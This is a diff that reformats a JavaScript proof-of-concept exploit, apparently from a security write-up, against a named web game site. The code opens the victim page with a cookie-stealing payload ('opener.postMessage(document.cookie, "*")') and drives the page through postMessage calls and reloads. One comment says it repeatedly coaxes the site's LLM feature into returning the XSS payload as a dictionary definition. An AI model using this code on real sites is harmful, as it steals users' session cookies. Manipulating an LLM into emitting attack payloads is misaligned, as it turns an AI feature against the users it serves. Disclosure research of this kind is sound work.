@@ -15,17 +15,13 @@ payload = 'opener.postMessage(document.cookie, "*")';
 
 onclick = () => {
   // Open the victim page.
-  w = open(
-    'https://play.bingoblitz.com/',
-    payload,
-    'width=10,height=10'
-  );
+  w = open('https://play.bingoblitz.com/', payload, 'width=10,height=10');
   w.resizeBy('-100', '-100');
 
   setInterval(() => {
     tryXSS(w);
   }, 10000);
-	tryXSS(w);
+  tryXSS(w);
 
   setInterval(() => {
     // Repeatedly asks the LLM nicely to provide the XSS payload as the definition JSON property.
@@ -38,19 +34,18 @@ onclick = () => {
 };
 
 function tryXSS(w) {
-setTimeout(() => {
-      // Toggle the dictionary feature
-      w.postMessage(
-        '{"action":"setMode","method":"setDictionary","optName":"dictionary","data":""}',
-        '*'
-      );
-    }, 3000);
+  setTimeout(() => {
+    // Toggle the dictionary feature
+    w.postMessage(
+      '{"action":"setMode","method":"setDictionary","optName":"dictionary","data":""}',
+      '*'
+    );
+  }, 3000);
 
-    setTimeout(() => {
-      // Reload the page.
-      w.location =
-        'https://play.bingoblitz.com/';
-    }, 4000);
+  setTimeout(() => {
+    // Reload the page.
+    w.location = 'https://play.bingoblitz.com/';
+  }, 4000);
 }
 ```
 
